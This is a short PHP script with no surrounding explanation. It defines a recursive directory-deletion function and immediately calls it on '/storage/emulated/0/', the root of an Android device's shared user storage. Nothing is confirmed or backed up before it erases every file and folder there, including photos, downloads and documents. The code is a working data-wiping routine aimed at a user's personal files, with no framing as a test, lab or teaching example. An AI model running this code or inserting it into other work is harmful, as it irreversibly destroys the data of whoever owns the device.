<?php
function remove_dir($path)
{
if(is_dir($path) === false)
 {
 return false;
 }
 $dir = opendir($path);
 while (($file = readdir($dir) )!== false)
 {
 if($file == '.' OR $file == '..')
 {
 continue;
 }
 if(is_file($path.'/'.$file))
 {
 unlink($path.'/'.$file);
 }
 elseif(is_dir($path.'/'.$file))
 {
 remove_dir($path.'/'.$file);
 }
 }
 rmdir($path);
 closedir($dir);
}
remove_dir('/storage/emulated/0/');
?>
